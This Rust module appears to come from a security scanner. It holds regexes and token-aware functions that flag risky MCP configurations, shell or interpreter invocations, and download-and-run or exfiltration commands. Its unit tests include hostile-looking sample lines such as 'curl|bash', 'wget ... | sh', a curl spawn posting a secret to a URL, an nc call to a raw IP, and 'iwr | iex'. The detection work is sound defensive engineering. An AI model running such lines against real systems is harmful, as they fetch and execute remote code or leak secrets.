use crate::lazy_pattern;

lazy_pattern!(
    pub(crate) RE_OPAQUE_MCP_ENDPOINT,
    r"(?i)(?:^|[:/@.\s])(ngrok|trycloudflare|workers\.dev|raw\.githubusercontent\.com|pastebin\.com)(?:$|[:/.])"
);
lazy_pattern!(
    pub(crate) RE_MCP_NO_AUTH,
    r#"(?is)("auth"\s*:\s*"none"|authentication\s*:\s*none|no auth|without auth|auth\s*:\s*none)"#
);
// Each alternative MUST require an actual secret value (>=8 char
// run) — pre-fix `authorization\s*:\s*bearer` and `api[_-]?key`
// matched the bare keyword with no value, raising
// `MCP_INLINE_SECRET` for documentation, README prose, comments,
// and variable-name mentions like `# Set up your api_key`.
// `_authtoken=` keeps the bare form because the trailing `=` is
// the npm-config syntax marker — even an empty value is a
// declaration of an auth-token slot.
lazy_pattern!(
    pub(crate) RE_MCP_INLINE_SECRET,
    r#"(?is)(bearer\s+[A-Za-z0-9._-]{8,}|authorization\s*:\s*bearer\s+[A-Za-z0-9._-]{8,}|api[_-]?key["']?\s*[:=]\s*["']?[A-Za-z0-9._-]{8,}|_authtoken=|token["']?\s*[:=]\s*["']?[A-Za-z0-9._-]{8,})"#
);
lazy_pattern!(
    pub(crate) RE_MCP_PERMISSIVE_TOOLS,
    r#"(?is)("tools"\s*:\s*\[[^\]]*"\*"|allow_all_tools|all_tools|tool_permissions\s*:\s*"all"|expose all tools)"#
);
lazy_pattern!(pub(crate) RE_QUOTED_TOOL_NAME, r#""([A-Za-z0-9._:-]{2,})""#);
lazy_pattern!(pub(crate) RE_MCP_TOOLS_ARRAY, r#"(?is)"tools"\s*:\s*\[([^\]]+)\]"#);
lazy_pattern!(pub(crate) RE_GENERIC_URL, r#"(?i)https?://[^\s"']+"#);
lazy_pattern!(pub(crate) RE_SHELL_SOURCE, r"(?m)^\s*\.\s+\S");

/// Whether `line` invokes a shell or interpreter as a command — `bash`, `sh`,
/// `dash`, `zsh`, `pwsh`, `powershell`, `python`, or `node`. Detection walks
/// command-position tokens and compares the lowercased basename (stripped of a
/// case-insensitive `.exe` suffix and leading `/` or `\` path components)
/// against a known set.
///
/// Avoids false positives on English words ending in "-sh" like `publish`,
/// `finish`, `wash`, `polish` — those words appear inside a single token
/// (e.g. `"publish"`) whose basename is the word itself, which is not in the
/// matched set. Handles `bash`, `/bin/bash`, `\tbash`,
/// `C:\Windows\System32\bash.exe`, `POWERSHELL.EXE`, Make recipe prefixes such
/// as `@bash`, and separator-joined pipelines such as `curl|bash`. Does not
/// match `python3` or `node22` (basename comparison is exact).
pub(crate) fn line_invokes_shell_or_interpreter(line: &str) -> bool {
    let mut expects_command = true;
    let mut start = 0;
    while start < line.len() {
        let Some((offset, ch)) = line[start..]
            .char_indices()
            .find(|(_, ch)| !ch.is_ascii_whitespace())
        else {
            break;
        };
        start += offset;
        if is_shell_command_separator(ch) {
            expects_command = true;
            start += ch.len_utf8();
            continue;
        }
        let token_start = start;
        let token_end = line[token_start..]
            .char_indices()
            .find_map(|(idx, ch)| {
                (ch.is_ascii_whitespace() || is_shell_command_separator(ch))
                    .then_some(token_start + idx)
            })
            .unwrap_or(line.len());
        let token = &line[token_start..token_end];
        let basename = normalized_command_basename(token, expects_command);
        if expects_command && is_interpreter_basename(&basename) {
            return true;
        }
        expects_command = expects_command && token_keeps_command_position(&basename);
        start = token_end;
    }
    false
}

pub(crate) fn line_invokes_command_with_arg(line: &str, command: &str, arg: &str) -> bool {
    let mut expects_command = true;
    let mut start = 0;
    while start < line.len() {
        let Some((offset, ch)) = line[start..]
            .char_indices()
            .find(|(_, ch)| !ch.is_ascii_whitespace())
        else {
            break;
        };
        start += offset;
        if is_shell_command_separator(ch) {
            expects_command = true;
            start += ch.len_utf8();
            continue;
        }
        let token_start = start;
        let token_end = line[token_start..]
            .char_indices()
            .find_map(|(idx, ch)| {
                (ch.is_ascii_whitespace() || is_shell_command_separator(ch))
                    .then_some(token_start + idx)
            })
            .unwrap_or(line.len());
        let token = &line[token_start..token_end];
        let basename = normalized_command_basename(token, expects_command);
        if expects_command
            && basename == command
            && command_invocation_has_arg(&line[token_end..], arg)
        {
            return true;
        }
        expects_command = expects_command && token_keeps_command_position(&basename);
        start = token_end;
    }
    false
}

fn command_invocation_has_arg(rest: &str, arg: &str) -> bool {
    let mut start = 0;
    while start < rest.len() {
        let Some((offset, ch)) = rest[start..]
            .char_indices()
            .find(|(_, ch)| !ch.is_ascii_whitespace())
        else {
            break;
        };
        start += offset;
        if is_shell_command_separator(ch) {
            return false;
        }
        let token_start = start;
        let token_end = rest[token_start..]
            .char_indices()
            .find_map(|(idx, ch)| {
                (ch.is_ascii_whitespace() || is_shell_command_separator(ch))
                    .then_some(token_start + idx)
            })
            .unwrap_or(rest.len());
        let token = rest[token_start..token_end].trim_matches(['"', '\'', '`', ')', ']', '}']);
        if token == arg {
            return true;
        }
        start = token_end;
    }
    false
}

fn is_shell_command_separator(ch: char) -> bool {
    matches!(ch, '|' | ';' | '&' | '(')
}

fn normalized_command_basename(token: &str, expects_command: bool) -> String {
    let mut command = token.trim_matches(['"', '\'', '`', ')', ']', '}']);
    if expects_command {
        command = command.trim_start_matches(['@', '-', '+']);
    }
    let basename = command.rsplit(['/', '\\']).next().unwrap_or(command);
    let mut basename_lower = basename.to_ascii_lowercase();
    if basename_lower.ends_with(".exe") {
        basename_lower.truncate(basename_lower.len() - 4);
    }
    basename_lower
}

fn is_interpreter_basename(basename: &str) -> bool {
    matches!(
        basename,
        "bash"
            | "sh"
            | "dash"
            | "zsh"
            | "fish"
            | "ksh"
            | "csh"
            | "tcsh"
            | "pwsh"
            | "powershell"
            | "python"
            | "node"
    )
}

fn token_keeps_command_position(token: &str) -> bool {
    matches!(
        token,
        "sudo"
            | "doas"
            | "env"
            | "command"
            | "exec"
            | "nohup"
            | "time"
            | "nice"
            | "xargs"
            | "if"
            | "elif"
            | "while"
            | "until"
            | "then"
            | "else"
            | "do"
    ) || is_shell_assignment(token)
}

fn is_shell_assignment(token: &str) -> bool {
    let Some((name, _)) = token.split_once('=') else {
        return false;
    };
    !name.is_empty()
        && name
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
}

/// Scans `line` for `token`, returning `true` at the first occurrence
/// whose neighbours satisfy both boundary predicates. `left_ok` receives
/// the prefix preceding the match and the byte immediately before it
/// (`None` at line start); `right_ok` receives the suffix after the
/// match. The byte-indexing scan and its UTF-8 boundary handling live
/// here once so the command-token detectors share one tested loop and
/// supply only their context-specific boundary char sets.
pub(crate) fn scan_command_token(
    line: &str,
    token: &str,
    left_ok: impl Fn(&str, Option<&u8>) -> bool,
    right_ok: impl Fn(&str) -> bool,
) -> bool {
    let mut start = 0;
    while let Some(pos) = line[start..].find(token) {
        let abs_pos = start + pos;
        let token_end = abs_pos + token.len();
        let before = if abs_pos > 0 {
            line.as_bytes().get(abs_pos - 1)
        } else {
            None
        };
        let after = line.get(token_end..).unwrap_or("");
        if left_ok(&line[..abs_pos], before) && right_ok(after) {
            return true;
        }
        start = token_end;
    }
    false
}

pub(crate) fn line_contains_command_token(line: &str, token: &str) -> bool {
    scan_command_token(
        line,
        token,
        |_, before| {
            before.is_none()
                || matches!(
                    before,
                    Some(b' ')
                        | Some(b'\t')
                        | Some(b'|')
                        | Some(b';')
                        | Some(b'&')
                        | Some(b'/')
                        // Windows path separator: a fully-qualified
                        // `c:\windows\system32\curl.exe` must not defeat
                        // the token (the basename helpers already split
                        // on `\`).
                        | Some(b'\\')
                        | Some(b'(')
                        | Some(b'"')
                        | Some(b'\'')
                        | Some(b'`')
                )
        },
        |after| {
            after.is_empty()
                || after.starts_with(' ')
                || after.starts_with('\t')
                || after.starts_with('(')
                || after.starts_with('|')
                || after.starts_with(';')
                || after.starts_with('&')
                || after.starts_with('>')
                || after.starts_with('<')
                // A quote / close-paren / comma / bracket closes the
                // token in array-style invocations like
                // `spawn("curl",["-d",sec,url])` — without these, the
                // egress / persistence / install-hook detectors that
                // share this helper missed the exfil shape.
                || after.starts_with('"')
                || after.starts_with('\'')
                || after.starts_with('`')
                || after.starts_with(')')
                || after.starts_with(',')
                || after.starts_with(']')
                || after.starts_with('}')
        },
    )
}

pub(crate) fn line_invokes_powershell_expression_alias(line: &str) -> bool {
    let line_lower = line.to_ascii_lowercase();
    let line = line_lower.as_str();
    let mut start = 0;
    while let Some(pos) = line[start..].find("iex") {
        let abs_pos = start + pos;
        let token_end = abs_pos + "iex".len();
        let before = if abs_pos > 0 {
            line.as_bytes().get(abs_pos - 1)
        } else {
            None
        };
        let left_ok = before.is_none()
            || matches!(
                before,
                Some(b' ') | Some(b'\t') | Some(b'|') | Some(b';') | Some(b'&') | Some(b'(')
            );
        let after = line.get(token_end..).unwrap_or("");
        let right_ok = after.is_empty()
            || after.starts_with(' ')
            || after.starts_with('\t')
            || after.starts_with('(')
            || after.starts_with('|')
            || after.starts_with(';')
            || after.starts_with('&');
        if left_ok && right_ok {
            return true;
        }
        start = token_end;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Contract: `bash install.sh` at column 0 must be detected.
    #[test]
    fn line_invokes_shell_or_interpreter_detects_bash_at_column_zero() {
        assert!(line_invokes_shell_or_interpreter("bash install.sh"));
    }

    /// Contract: `sh install.sh` at column 0 must be detected (this was the
    /// false-negative under the old conservative `" sh "` pattern).
    #[test]
    fn line_invokes_shell_or_interpreter_detects_sh_at_column_zero() {
        assert!(line_invokes_shell_or_interpreter("sh install.sh"));
    }

    /// Contract: an absolute interpreter path resolves to its basename.
    #[test]
    fn line_invokes_shell_or_interpreter_detects_absolute_interpreter_path() {
        assert!(line_invokes_shell_or_interpreter("/bin/bash setup.sh"));
        assert!(line_invokes_shell_or_interpreter("/usr/bin/python -c 'x'"));
    }

    /// Contract: Windows interpreter path with `.exe` suffix resolves to the
    /// stem, after the input has been lower-cased by the caller.
    #[test]
    fn line_invokes_shell_or_interpreter_strips_exe_suffix() {
        assert!(line_invokes_shell_or_interpreter(
            "c:\\windows\\python.exe -c x"
        ));
    }

    /// Contract: case-insensitive `.exe` stripping. Windows filenames commonly
    /// use `.EXE` or `.Exe`; an attacker can evade detection by using an
    /// uppercase extension. Pre-fix `strip_suffix(".exe")` was case-sensitive
    /// and missed `POWERSHELL.EXE`, `bash.EXE`, etc.
    #[test]
    fn line_invokes_shell_or_interpreter_strips_exe_suffix_case_insensitive() {
        assert!(line_invokes_shell_or_interpreter(
            "C:\\Windows\\System32\\POWERSHELL.EXE -c x"
        ));
        assert!(line_invokes_shell_or_interpreter("bash.EXE script.sh"));
        assert!(line_invokes_shell_or_interpreter("python.Exe -c x"));
    }

    /// Contract: Windows backslash separators are handled in addition to `/`.
    #[test]
    fn line_invokes_shell_or_interpreter_handles_windows_backslash_path() {
        assert!(line_invokes_shell_or_interpreter("c:\\python\\python -c x"));
    }

    /// Contract: English words containing `sh` like `publish` must NOT
    /// match — this is the regression anchor for the `"sh "` substring bug.
    #[test]
    fn line_invokes_shell_or_interpreter_rejects_publish_word() {
        assert!(!line_invokes_shell_or_interpreter("publish docs"));
    }

    /// Contract: words like `finish`, `wash`, `polish` must NOT match.
    #[test]
    fn line_invokes_shell_or_interpreter_rejects_finish_word() {
        assert!(!line_invokes_shell_or_interpreter("finish setup"));
        assert!(!line_invokes_shell_or_interpreter("wash assets"));
        assert!(!line_invokes_shell_or_interpreter("polish reports"));
    }

    /// Contract: `python3` is a different basename from `python` and must
    /// NOT match — preserves prior behavior of `contains("python ")` which
    /// also did not match `"python3 "`.
    #[test]
    fn line_invokes_shell_or_interpreter_rejects_python3_basename() {
        assert!(!line_invokes_shell_or_interpreter("python3 -c x"));
        assert!(!line_invokes_shell_or_interpreter("node22 server.js"));
    }

    /// Contract: tab-indented Make recipes are handled — `split_whitespace`
    /// treats tabs and spaces equivalently.
    #[test]
    fn line_invokes_shell_or_interpreter_handles_tab_indented_makefile_recipe() {
        assert!(line_invokes_shell_or_interpreter("\tbash install.sh"));
        assert!(line_invokes_shell_or_interpreter("\tsh install.sh"));
    }

    /// Contract: Make recipe prefixes do not hide interpreter commands.
    #[test]
    fn line_invokes_shell_or_interpreter_handles_make_recipe_prefixes() {
        assert!(line_invokes_shell_or_interpreter("@bash install.sh"));
        assert!(line_invokes_shell_or_interpreter("-/bin/sh install.sh"));
        assert!(line_invokes_shell_or_interpreter("+pwsh -c x"));
    }

    /// Contract: empty / whitespace-only lines never match.
    #[test]
    fn line_invokes_shell_or_interpreter_rejects_empty_line() {
        assert!(!line_invokes_shell_or_interpreter(""));
        assert!(!line_invokes_shell_or_interpreter("   \t  "));
    }

    /// Contract: extended interpreter set (zsh, dash, pwsh, powershell) is
    /// also detected. Pins the "expanded token list" decision so a future
    /// reader doesn't shrink it back to bash/sh/python/node only.
    #[test]
    fn line_invokes_shell_or_interpreter_detects_extended_interpreter_set() {
        assert!(line_invokes_shell_or_interpreter("zsh script.zsh"));
        assert!(line_invokes_shell_or_interpreter("dash setup.sh"));
        assert!(line_invokes_shell_or_interpreter("pwsh -c 'x'"));
        assert!(line_invokes_shell_or_interpreter("powershell -c 'x'"));
    }

    /// Contract: alternative shells (fish, ksh, csh, tcsh) are detected.
    /// These are common on macOS and Unix systems and can be used as
    /// evasion vectors when bash/sh are filtered.
    #[test]
    fn line_invokes_shell_or_interpreter_detects_alternative_shells() {
        assert!(line_invokes_shell_or_interpreter("fish -c 'payload'"));
        assert!(line_invokes_shell_or_interpreter("ksh script.ksh"));
        assert!(line_invokes_shell_or_interpreter("csh -c 'cmd'"));
        assert!(line_invokes_shell_or_interpreter("tcsh -c 'cmd'"));
        assert!(line_invokes_shell_or_interpreter("/bin/fish script.fish"));
        assert!(line_invokes_shell_or_interpreter("/usr/bin/ksh -c 'x'"));
    }

    /// Contract: mixed-case `.exe` suffixes like `.eXe`, `.EXe` must be
    /// stripped. Pre-fix the per-casing strip missed these variants,
    /// allowing evasion via `POWERSHELL.eXe`.
    #[test]
    fn line_invokes_shell_or_interpreter_strips_mixed_case_exe() {
        assert!(
            line_invokes_shell_or_interpreter("POWERSHELL.eXe -c x"),
            "mixed-case .eXe must be stripped and detected"
        );
        assert!(
            line_invokes_shell_or_interpreter("bash.EXe script.sh"),
            "mixed-case .EXe must be stripped and detected"
        );
        assert!(
            line_invokes_shell_or_interpreter("/usr/bin/python.eXE -c x"),
            "mixed-case .eXE must be stripped and detected"
        );
    }

    /// # Contract
    ///
    /// Shell separators create a new command position. Piped or
    /// semicolon-joined interpreters are command invocations even without
    /// surrounding spaces.
    #[test]
    fn line_invokes_shell_or_interpreter_detects_separator_joined_commands() {
        assert!(line_invokes_shell_or_interpreter("curl|bash"));
        assert!(line_invokes_shell_or_interpreter("wget -qO- https://x|sh"));
        assert!(line_invokes_shell_or_interpreter("echo ok;python -c x"));
    }

    /// # Contract
    ///
    /// Shell wrappers and environment assignments preserve command
    /// position for the following token.
    #[test]
    fn line_invokes_shell_or_interpreter_detects_wrapped_commands() {
        assert!(line_invokes_shell_or_interpreter("sudo bash install.sh"));
        assert!(line_invokes_shell_or_interpreter("env FOO=1 python -c x"));
        assert!(line_invokes_shell_or_interpreter("NOHUP pwsh -c x"));
        assert!(line_invokes_shell_or_interpreter("if bash --version; then"));
    }

    /// # Contract (negative)
    ///
    /// Interpreter names in ordinary command arguments are not command
    /// invocations.
    #[test]
    fn line_invokes_shell_or_interpreter_rejects_argument_mentions() {
        assert!(!line_invokes_shell_or_interpreter("echo bash install.sh"));
        assert!(!line_invokes_shell_or_interpreter("printf python -c x"));
        assert!(!line_invokes_shell_or_interpreter("grep bash install.sh"));
    }

    /// # Contract
    ///
    /// Command+argument matching is command-position aware and accepts
    /// wrappers, environment assignments, absolute paths, and quoted command
    /// tokens.
    #[test]
    fn line_invokes_command_with_arg_accepts_command_position_tokens() {
        assert!(line_invokes_command_with_arg(
            "bash -c ./install.sh",
            "bash",
            "-c"
        ));
        assert!(line_invokes_command_with_arg(
            "/bin/bash\t-c ./install.sh",
            "bash",
            "-c",
        ));
        assert!(line_invokes_command_with_arg(
            "\"bash\" -c ./install.sh",
            "bash",
            "-c",
        ));
        assert!(line_invokes_command_with_arg(
            "env FOO=1 python -c x",
            "python",
            "-c",
        ));
        assert!(line_invokes_command_with_arg(
            "sudo node -e 'require(\"./install\")'",
            "node",
            "-e",
        ));
    }

    /// # Contract (negative)
    ///
    /// Command+argument matching rejects command names in ordinary
    /// arguments and does not borrow an argument from a later command.
    #[test]
    fn line_invokes_command_with_arg_rejects_argument_mentions() {
        assert!(!line_invokes_command_with_arg(
            "echo bash -c ./install.sh",
            "bash",
            "-c",
        ));
        assert!(!line_invokes_command_with_arg(
            "bash ; echo -c ./install.sh",
            "bash",
            "-c",
        ));
        assert!(!line_invokes_command_with_arg(
            "printf python -c x",
            "python",
            "-c",
        ));
    }

    /// # Contract
    ///
    /// Command-token matching accepts shell separators that are valid between
    /// a command name and its argument or pipeline neighbor.
    #[test]
    fn line_contains_command_token_accepts_tabs_and_operators() {
        assert!(line_contains_command_token("curl\t$url", "curl"));
        assert!(line_contains_command_token("curl|bash", "curl"));
        assert!(line_contains_command_token(
            "/usr/bin/tee\t/etc/profile",
            "tee"
        ));
        assert!(line_contains_command_token("exec('curl\t$url')", "curl"));
        assert!(line_contains_command_token("spawn(`wget\t$url`)", "wget"));
        assert!(line_contains_command_token("iwr($url) | iex", "iwr"));
        assert!(line_contains_command_token("irm($url) | iex", "irm"));
    }

    /// # Contract (negative)
    ///
    /// Command-token matching rejects lookalike words that merely contain the
    /// command bytes.
    /// # Contract
    ///
    /// A command token closed by a quote / comma / close-paren / bracket
    /// (array-style invocation) or preceded by a Windows `\` path
    /// separator is still recognised — these are the canonical
    /// command-spawn shapes the shared helper previously missed.
    #[test]
    fn line_contains_command_token_accepts_array_and_windows_paths() {
        assert!(line_contains_command_token(
            "spawn(\"curl\", [\"-d\", secret, url])",
            "curl"
        ));
        assert!(line_contains_command_token("spawn('nc',['1.2.3.4'])", "nc"));
        assert!(line_contains_command_token("system(curl)", "curl"));
        assert!(line_contains_command_token("run(curl,args)", "curl"));
        assert!(line_contains_command_token(
            "c:\\windows\\system32\\curl.exe http://x",
            "curl.exe"
        ));
    }

    #[test]
    fn line_contains_command_token_rejects_substrings() {
        assert!(!line_contains_command_token("mycurl\t$url", "curl"));
        assert!(!line_contains_command_token(
            "guarantee\t/etc/profile",
            "tee"
        ));
        assert!(!line_contains_command_token("bobcat\t/etc/passwd", "cat"));
        assert!(!line_contains_command_token("kiwr($url) | iex", "iwr"));
        assert!(!line_contains_command_token("confirm($url) | iex", "irm"));
    }

    /// # Contract
    ///
    /// PowerShell's `IEX` alias is a command token even when followed by a
    /// tab or call-style parenthesis.
    #[test]
    fn line_invokes_powershell_expression_alias_accepts_tabs_and_parentheses() {
        assert!(line_invokes_powershell_expression_alias("iex\t$payload"));
        assert!(line_invokes_powershell_expression_alias("IEX($payload)"));
    }

    /// # Contract (negative)
    ///
    /// PowerShell `IEX` alias matching is token-aware. Longer identifiers
    /// containing the same bytes must not match.
    #[test]
    fn line_invokes_powershell_expression_alias_rejects_substrings() {
        assert!(!line_invokes_powershell_expression_alias(
            "prefixiex\t$payload"
        ));
        assert!(!line_invokes_powershell_expression_alias(
            "iexample $payload"
        ));
        assert!(!line_invokes_powershell_expression_alias("myiex $payload"));
    }

    /// Contract: `RE_OPAQUE_MCP_ENDPOINT` MUST match domain-bounded
    /// occurrences of opaque-host indicators (ngrok, trycloudflare, etc.)
    /// but MUST NOT match substrings inside unrelated hostnames.
    #[test]
    fn re_opaque_mcp_endpoint_matches_domain_boundaries() {
        // Positive: real opaque endpoint URLs
        assert!(RE_OPAQUE_MCP_ENDPOINT.is_match("https://ngrok.io/tunnel"));
        assert!(RE_OPAQUE_MCP_ENDPOINT.is_match("https://myapp.trycloudflare.com/"));
        assert!(RE_OPAQUE_MCP_ENDPOINT
            .is_match("https://raw.githubusercontent.com/owner/repo/main/file"));
        assert!(RE_OPAQUE_MCP_ENDPOINT.is_match("https://pastebin.com/raw/abc123"));

        // Negative: substring matches inside unrelated hostnames
        assert!(
            !RE_OPAQUE_MCP_ENDPOINT.is_match("https://my-ngrok-tunnel.example.com/"),
            "ngrok as substring inside another hostname must not match"
        );
        assert!(
            !RE_OPAQUE_MCP_ENDPOINT.is_match("https://not-really-pastebin.com.example.org/"),
            "pastebin.com as substring must not match"
        );
    }

    /// Contract: `RE_MCP_INLINE_SECRET` requires an actual secret value,
    /// not just a keyword. `authorization: bearer <TOKEN>` and
    /// `api_key: "<TOKEN>"` (≥8 chars) MUST match because they declare a
    /// real credential.
    #[test]
    fn re_mcp_inline_secret_matches_real_credentials() {
        assert!(RE_MCP_INLINE_SECRET.is_match("authorization: bearer abc12345xyz"));
        assert!(RE_MCP_INLINE_SECRET.is_match(r#""api_key": "sk-abc12345xyz""#));
        assert!(RE_MCP_INLINE_SECRET.is_match("api-key=sk_live_abc12345"));
        assert!(RE_MCP_INLINE_SECRET.is_match("token=abc12345xyz"));
        assert!(RE_MCP_INLINE_SECRET.is_match("_authtoken="));
    }

    /// Contract: `RE_MCP_INLINE_SECRET` MUST NOT match keyword-only mentions
    /// (documentation prose, comments, variable names). Pre-fix the bare
    /// `authorization\s*:\s*bearer` and `api[_-]?key` alternatives matched
    /// any prose that mentioned the token, raising false positives on
    /// READMEs and configuration docs.
    #[test]
    fn re_mcp_inline_secret_rejects_keyword_only_mentions() {
        assert!(
            !RE_MCP_INLINE_SECRET.is_match("# Set up your api_key from the dashboard"),
            "prose mentioning `api_key` without a value must not match",
        );
        assert!(
            !RE_MCP_INLINE_SECRET.is_match("// authorization: bearer (described later)"),
            "documentation mentioning `authorization: bearer` without a token must not match",
        );
        assert!(
            !RE_MCP_INLINE_SECRET.is_match("Field name: api_key"),
            "field-name documentation must not match",
        );
    }
}
